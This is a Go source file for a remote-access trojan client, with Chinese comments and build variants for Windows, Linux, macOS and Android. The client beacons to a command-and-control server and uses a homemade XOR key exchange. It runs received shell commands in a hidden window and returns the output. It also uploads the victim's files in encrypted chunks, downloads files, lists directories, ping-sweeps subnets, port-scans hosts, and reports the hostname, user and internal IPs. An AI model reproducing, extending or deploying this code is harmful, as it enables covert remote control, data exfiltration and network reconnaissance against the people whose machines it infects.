/*android package lib*/
package main
import (
	"bytes"
	"math/rand"
	"io"
	"io/ioutil"
	"net/http"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
	"mime/multipart"
	"strconv"
	"encoding/base64"
	"sync"
	/*linux版本忽略syscall，http版本忽略"crypto/tls"*/
	"syscall"
	// "crypto/tls"
)
var(
	/*osname string = "linux"
	osname string = "android"
	osname string = "macos"
	*/osname string = "win"
	/*选择协议protocol = "https://"*/
	protocol = "http://"
	uid string
	version string
	clientname string
	delay int8 = 30
	waitTime int = 3
	onece bool = true
	user string = "******"
	master string = "127.0.0.1:6643"
	key string = "null"
	get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
	post_headers map[string]string= map[string]string{"Content-Type":"application/json","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
    keyPartArr []int
	transport http.RoundTripper
	client *http.Client
	file_byte_parts = make(map[string][]byte)
	DownloadFile_byte_parts = make(map[string][]byte)
)
func initHttpClient() {
    transport = &http.Transport{
		MaxIdleConnsPerHost:   100,
        MaxIdleConns:          100,
        IdleConnTimeout:       0,
        DisableKeepAlives:     false,
        DialContext: (&net.Dialer{
            Timeout:   30 * time.Second,
            KeepAlive: 30 * time.Second,
        }).DialContext,
		/*https TLSClientConfig: &tls.Config{
		     InsecureSkipVerify: true,
		},*/
    }
    client = &http.Client{
        Transport: transport,
        Timeout:   30 * time.Second,
    }
}
func getUrl(url string) string {
	var resp *http.Response
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	for key, value := range get_headers {
		req.Header.Set(key, value)
	}
	resp, err = client.Do(req)
	if err != nil {
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		resp.Body.Close()
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	resp.Body.Close()
	if len(respBody) == 0 {
		return ""
	}
	return strings.TrimSpace(string(respBody)) // 成功返回响应
}
func post(data map[string]string, re_url string) {
	var jsonData bytes.Buffer
	jsonData.WriteString("{")
	for key, value := range data {
		jsonData.WriteString(`"` + key + `":"` + value + `",`)
	}
	jsonStr := jsonData.String()
	if len(jsonStr) > 1 {
		jsonStr = jsonStr[:len(jsonStr)-1]
	}
	jsonStr += "}"
	req, err := http.NewRequest("POST", re_url, bytes.NewBuffer([]byte(jsonStr)))
	if err != nil {
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	for key, value := range post_headers {
		req.Header.Set(key, value)
	}
	resp, err := client.Do(req)
	if err != nil {
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	resp.Body.Close()
	return // 成功后退出函数
}
// 下载并解密文件
func downloadFile(re_url, fileKey string) {
	encryData := get_encry_s(&fileKey)
    url := protocol + master + "/index.php?op=gF&uid=" + uid + "&fk=" + encryData
    filesplit := strings.Split(fileKey, "*")
	if len(filesplit) < 3{
		return
	} 
    filename := filesplit[1]
    var fullData []byte
	for {
		response, err := http.Get(url)
		if err != nil {
			return
		}
		defer response.Body.Close()
		fileData, err := io.ReadAll(response.Body)
		if err != nil {
			return
		}
		if len(fileData) == 0 {
			break
		}
		fullData = append(fullData, fileData...)
		time.Sleep(time.Duration(delay) * time.Second)
	}
    file_byte_parts[fileKey] = fullData
    if err := get_encry_f(filename, fileKey); err != nil {
        return
    }
}

// 上传
func getUfile(cmd, splitSize string) {
    intSize, _ := strconv.Atoi(splitSize)
    fileContent, _ := get_decry_f(cmd)
    fileSize := len(fileContent)
    start := 0 
    end := intSize       
    for start < fileSize {
        if end > fileSize {
            end = fileSize
        }
        str_encry := user + "^" + splitSize + "^" + strconv.Itoa(fileSize) + "^" + strconv.Itoa(start) + "^" + strconv.Itoa(end)
        data_encry := get_encry_s(&str_encry)
        chunk := fileContent[start:end]
        var buffer bytes.Buffer
        writer := multipart.NewWriter(&buffer)
        part, _ := writer.CreateFormFile("filedata", cmd) // 使用实际的文件名
        io.Copy(part, bytes.NewReader(chunk))
        writer.WriteField("u", uid)
        writer.WriteField("d", data_encry)
        writer.Close()
        url := protocol + master + "/index.php?op=uf"
        req, _ := http.NewRequest("POST", url, &buffer)
        req.Header.Set("Content-Type", writer.FormDataContentType())
        req.Header.Set("Range", "bytes"+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
        resp,err := client.Do(req)
		if err != nil {
			return
		}
        defer resp.Body.Close()
        if resp.StatusCode != http.StatusOK {
            return
        }
        start = end
        end = start + intSize
        time.Sleep(time.Duration(delay) * time.Second)
    }
}

func getCmd() {
	url := protocol + master + "/index.php?op=gM&uid="+uid
	re_url := protocol + master + "/index.php?op=re"
	file_url := protocol + master + "/index.php?op=pl"
	var job,shell string
	var msg []string
	for {
		time.Sleep(time.Duration(delay) * time.Second)
		respBody := getUrl(url)
		if strings.Contains(respBody, "010011010010011001") || respBody == "" {
			continue
		}else if respBody == "011001010010101000100010010110110100110101101000100010010110110"{
			onece = true
			main()
			// Lib()
		}
		cmd := get_decry_s(&respBody)
		msg=strings.Split(cmd,"^")
		job=string(msg[0])
		if len(msg)>1{
			shell=string(msg[1])
		}
		switch job {
			case "getUfriends":
				scan_u_firends(msg[1],msg[2],msg[3],msg[4],"ping")
			case "getTime":
				getTime()
			case "getUfile":
				go getUfile(msg[1],msg[2])
			case "loadUfile":
				go downloadFile(re_url,msg[1])
			case "lookUpFile":
				listDir(shell,file_url)
			case "getHisports":
				scan_u_firends(msg[1],msg[2],msg[3],msg[4],"port")
			case "SwUVer":
				version = shell
			default:
				go get_Command(cmd,re_url)
		}
	}
}
func get_Command(cmd,re_url string) {
	result := Command(cmd)
	if result != "" {
		encry_result := get_encry_s(&result)
		data:= map[string]string{
			"uid": uid,
			"results": encry_result,
		}
		post(data, re_url)
	}
	return
}
func Command(cmd string) string {
	command := exec.Command(version, "/C", cmd)
	command.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	var stdout bytes.Buffer
	command.Stdout = &stdout
	command.Run()
	return stdout.String()
}
/*
linux版本
func Command(cmd string) string {
	cmdObj := exec.Command(version, "-c", cmd)
	result, err := cmdObj.CombinedOutput()
	if err != nil {
		return ""
	}
	return string(result)
}
*/
func listDir(cmd, file_url string) {
	var fileNames string
	files,_ := ioutil.ReadDir(cmd)
	for _, file := range files {
		if file.IsDir() {
			fileNames += "dir" + file.Name() + "\n"
		} else {
			fileSize := file.Size()
			fileSizeMB := float64(fileSize) / (1024 * 1024)
			fileSizeStr := strconv.FormatFloat(fileSizeMB, 'f', 2, 64)
			fileNames += "fil " + file.Name() + " (Size: " + fileSizeStr + " MB)\n"
		}
	}
	if fileNames == "" {fileNames = "is empty"}
	encryptedStr := get_encry_s(&fileNames)
	data := map[string]string{
		"uid":  uid,
		"file": encryptedStr,
	}
	post(data, file_url)
	return
}
func getTime() {
    url := protocol + master + "/index.php?op=st&uid=" + uid
    respBody := getUrl(url)
	resp_decry := get_decry_s(&respBody)
    gtime := resp_decry
    parsedTime, _ := strconv.ParseInt(gtime, 10, 8)
    delay = int8(parsedTime)
    if t, ok := transport.(*http.Transport); ok {
        if delay >= 30 {
            t.IdleConnTimeout = 5 * time.Second  // Set IdleConnTimeout to 30 seconds
        } else {
            t.IdleConnTimeout = 0  // Reset to 0 (no idle timeout)
        }
    }
    return
}
func scan_u_firends(ip,portList,delay,choice,option string) {
	var resultBuilder strings.Builder
	var wg sync.WaitGroup
	var mutex sync.Mutex
	var port_list []int
	var temp_split []string
	var open_ports,re_url string
	if strings.Contains(portList, ",") {
		temp_split = strings.Split(portList, ",")
	} else if strings.Contains(portList, "-") {
		temp_split = strings.Split(portList, "-")
		start_port, _ := strconv.Atoi(temp_split[0])
		end_port, _ := strconv.Atoi(temp_split[1])
		for i := start_port; i <= end_port; i++ {
			port_list = append(port_list, i)
		}
	} else {
		temp_split = append(temp_split,ip)
	}
	for _, v := range temp_split {
		port,_:= strconv.Atoi(v)
		port_list = append(port_list, port)
	}
	sleep_time,_:= strconv.Atoi(delay)
	for _, port := range port_list {
		wg.Add(1)
		time.Sleep(time.Duration(sleep_time) * time.Second)
		if option == "ping"{
			if len(port_list) > 255 {resultBuilder.WriteString("too~many~ipNet!");return}
			target := ip + "." + strconv.Itoa(port)
			go ping(target, &wg, &resultBuilder, &mutex)
		}else if option == "port"{
			if len(port_list) > 65535{resultBuilder.WriteString("too~many~port!");return}
			go scan_port(ip, port, &wg, &resultBuilder, &mutex)
		}
	}
	wg.Wait()
	if option == "ping" && choice == "save" {
		open_ports = "innet^" + resultBuilder.String()
	} else if option == "port" && choice == "save" {
		open_ports = "inport^" + resultBuilder.String()
	} else if choice != "save" {
		open_ports = resultBuilder.String()
	}
	encry_data:= get_encry_s(&open_ports)
	data:= map[string]string{
		"uid": uid,
		"results": encry_data,
	}
	if choice == "save" {
		re_url = protocol + master + "/index.php?op=ren"
	} else {
		re_url = protocol + master + "/index.php?op=re"
	}	
	post(data, re_url)
	return
}
func scan_port(ip string, port int, wg *sync.WaitGroup, resultBuilder *strings.Builder, mutex *sync.Mutex) {
	defer wg.Done()
	conn, err := net.DialTimeout("tcp", ip+":"+strconv.Itoa(port), time.Second)
	if err != nil {return}
	defer conn.Close()
	target := ip + ":[" + strconv.Itoa(port) + "]~port\n"
	mutex.Lock()
	defer mutex.Unlock()
	resultBuilder.WriteString(target)
}
func ping(ip string, wg *sync.WaitGroup, resultBuilder *strings.Builder,mutex *sync.Mutex) {
	defer wg.Done()
	var cmd string
	var ping_ver string
	var ping_pattern string
	if osname == "win" {
		ping_ver = "-n"
		ping_pattern = "TTL"
		cmd = "ping " + ping_ver + " 1 " + ip
	} else if osname == "linux" || osname == "macos" || osname == "android"{
		ping_ver = "-c"
		ping_pattern = "ttl="
		cmd = "ping " + ping_ver + " 1 " + ip
	}
	ping := Command(cmd)
	if strings.Contains(ping, ping_pattern) {
		target := "[" + ip + "]~online\n"
		mutex.Lock()
		defer mutex.Unlock()
		resultBuilder.WriteString(target)
	}
}
func getInternalIPs() string {
	var ips []string
	interfaces, _ := net.Interfaces()
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip != nil && ip.To4() != nil {
				ips = append(ips, ip.String())
			}
		}
	}
	return strings.Join(ips, ",")
}
func generateUUID() string {
    rand.Seed(time.Now().UnixNano())
    uuid := make([]byte, 12)
    for i := 0; i < 12; i++ {
        uuid[i] = byte(rand.Intn(256))
    }
    uuid[6] = (uuid[6] & 0x0f) | 0x40
    uuid[8] = (uuid[8] & 0x3f) | 0x80
    uuidStr := byteSliceToHex(uuid[0:4]) + "-" +
        byteSliceToHex(uuid[4:6]) + "-" +
        byteSliceToHex(uuid[6:8]) + "-" +
        byteSliceToHex(uuid[8:10]) + "-" +
        byteSliceToHex(uuid[10:])
    return uuidStr
}
func byteSliceToHex(bytes []byte) string {
    hexChars := "0123456789abcdef"
    result := make([]byte, len(bytes)*2)
    for i, b := range bytes {
        result[i*2] = hexChars[b>>4]
        result[i*2+1] = hexChars[b&0x0f]
    }
    return string(result)
}
func send() {
	re_url := protocol + master + "/index.php?op=gi"
	currentDir, _:= os.Getwd()
	currentDir = strings.ReplaceAll(currentDir, "\\", "/")
	add_str := clientname +"^"+ user +"^"+ osname +"^"+ strconv.Itoa(int(delay)) +"^"+ getInternalIPs() +"^"+ currentDir +"^"+ version
	encry_str := get_encry_s(&add_str)
	data:= map[string]string{"d":uid,"f":encry_str}
	post(data, re_url)
}
// 加密函数
func EncryptDecrypt(input []byte) []byte {
	if len(input) == 0 {
		return nil
	}
	var result []byte
	startIndex := 0
	for i := 1; i <= len(key); i++ {
		if len(input) <= keyPartArr[i%len(keyPartArr)] {
			startIndex = int(key[keyPartArr[i%len(keyPartArr)]%len(key)]) % len(key)
			break
		}else if len(input) >=  keyPartArr[i%len(keyPartArr)] {
			startIndex = len(key) % int(key[keyPartArr[i%len(keyPartArr)]%len(key)]) 
            break
		}
	}
	for i, b := range input {
		key_ := key[(startIndex+i)%len(key)]
		result = append(result, b^key_)
	}
	return result
}
func get_decry_f(filePath string) ([]byte, error) {
    data,_:= ioutil.ReadFile(filePath)
    decrypted := EncryptDecrypt(data)
    return decrypted, nil
}
func get_encry_f(filepath, file_key string) error {
    data,_:= file_byte_parts[file_key]
    decrypted := EncryptDecrypt(data)
    err := os.WriteFile(filepath, decrypted, 0666)
    if err != nil {return err}
    return nil
}
// 加密字符串
func get_encry_s(input *string) string {
	encryptedBytes := EncryptDecrypt([]byte(*input))
	return base64.URLEncoding.EncodeToString(encryptedBytes)
}
// 解密字符串
func get_decry_s(input *string) string {
	// Base64 解码
	decodedBytes, err := base64.URLEncoding.DecodeString(*input)
	if err != nil {
		return ""
	}
	decryptedBytes := EncryptDecrypt(decodedBytes)
	return string(decryptedBytes)
}
func decryptString(key string, pavi_key []int) string {
	if key != "null" {
		client_key := []byte(key)
		for j := 0; j < 256 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[0]) {client_key[j] = client_key[j] ^ byte(pavi_key[0])}}
		for j := 256; j < 512 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[1]) {client_key[j] = client_key[j] ^ byte(pavi_key[1])}}
		for j := 512; j < 768 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[2]) {client_key[j] = client_key[j] ^ byte(pavi_key[2])}}
		for j := 768; j < len(client_key); j++ {if client_key[j] < byte(pavi_key[3]) {client_key[j] = client_key[j] ^ byte(pavi_key[3])}}
		return string(client_key)
	}
	return "null"
}
func generateAndUpdateKey(url, uid string) []int {
	key_map := []int{rand.Intn(50) + 1, rand.Intn(50) + 1, rand.Intn(50) + 1, rand.Intn(50) + 1}
	respBody := getUrl(url)
	if respBody == "" {
		return nil
	}
	conn_parts := strings.Split(respBody, "-")
	if len(conn_parts) < 8 {
		time.Sleep(2 * time.Second)
		main()
		// Lib()
	}
	serverpub_key := conn_parts[:4]
	servermid := conn_parts[4:]
	for i := 0; i < len(serverpub_key); i++ {
		serverVal, _ := strconv.Atoi(serverpub_key[i])
		clientVal := key_map[i]
		exchangeVal := serverVal ^ clientVal
		key_map = append(key_map, exchangeVal)
	}
	for i := 0; i < len(servermid); i++ {
		serverVal, _ := strconv.Atoi(servermid[i])
		exchangeVal := key_map[i]
		intermediateVal := serverVal ^ exchangeVal
		key_map = append(key_map, intermediateVal)
	}
	key_url := protocol + master + "/index.php?op=sK&uid=" + uid + "&keyPart=" + strconv.Itoa(key_map[4]) + "-" + strconv.Itoa(key_map[5]) + "-" + strconv.Itoa(key_map[6])+ "-" + strconv.Itoa(key_map[7])
	getUrl(key_url)
	return []int{key_map[8], key_map[9], key_map[10],key_map[11]}
}
func getConn(newKey_map *[]int) {
	key = "null"
	keyPartArr = []int{}
	get_inUrl := protocol + master + "/index.php?op=gM&uid=" + uid
	get_keyUrl := protocol + master + "/index.php?op=EK&uid=" + uid
	for {
		time.Sleep(5 * time.Second)
		key_str := getUrl(get_keyUrl)
		key =  decryptString(key_str,*newKey_map)
		if key !="null"{
			in_p := getUrl(get_inUrl)
			if strings.Contains(in_p, "010011010010011001"){
				onece = false
				return
			}
		}
	}
}
/*android func Lib() { */
func main() {
	if onece {
		initHttpClient()
		if uid == "" {uid = generateUUID()}
		if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
		clientname = strings.TrimSpace(Command("hostname"))
		post_headers["Host"] = master
		get_headers["Host"] = master
		url := protocol + master + "/index.php?op=co&uid=" + uid + "&username=" + user + "&request=" + clientname
		newKey_map:= generateAndUpdateKey(url, uid)
		for {
			getConn(&newKey_map)
			if !onece && key != "null" {
				keyPartArr = append(keyPartArr,6,17,int(key[24])-20,int(key[13]),45,int(key[74])-15,78,128, int(key[45])+int(key[67]) ,256, int(key[79])+int(key[89])+int(key[106]) ,384, int(key[85])+int(key[94])+int(key[189])+int(key[216]),512,
                                   int(key[43])+int(key[443]),640,int(key[330])+int(key[864])+int(key[611]),768+int(key[569]),int(key[673])+int(key[74]),int(key[334])+int(key[489])+int(key[994]),int(key[6])+int(key[699])+int(key[1002]))
				send()
				getCmd()
			} else {
				continue
			}
		}
	}else{getCmd()}
}
